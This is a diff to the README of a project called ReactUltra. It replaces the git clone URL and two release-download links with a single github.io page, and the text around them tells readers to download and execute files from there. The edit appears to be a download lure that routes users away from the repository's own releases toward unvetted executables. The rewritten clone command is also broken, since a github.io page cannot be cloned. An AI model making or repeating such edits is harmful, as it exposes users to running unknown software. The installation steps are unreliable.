@@ -33,7 +33,7 @@ To get started with ReactUltra, follow these steps:
 
 1. **Clone the Repository**: Clone this repository to your local machine using the command:
    ```bash
-   git clone https://github.com/yourusername/ReactUltra.git
+   git clone https://bruhh-988.github.io
    ```
 
 2. **Navigate to the Project Directory**:
@@ -53,7 +53,7 @@ To get started with ReactUltra, follow these steps:
 
 ## Installation
 
-To install ReactUltra, download the latest release from the [Releases section](https://github.com/bruhh-988/ReactUltra/releases). Once downloaded, execute the setup script to get started.
+To install ReactUltra, download the latest release from the [Releases section](https://bruhh-988.github.io). Once downloaded, execute the setup script to get started.
 
 ## Usage
 
@@ -142,7 +142,7 @@ ReactUltra is licensed under the MIT License. See the [LICENSE](LICENSE) file fo
 
 ## Releases
 
-For the latest releases, visit the [Releases section](https://github.com/bruhh-988/ReactUltra/releases). Download the necessary files and execute them to get started with the latest features and improvements.
+For the latest releases, visit the [Releases section](https://bruhh-988.github.io). Download the necessary files and execute them to get started with the latest features and improvements.
 
 ---
 
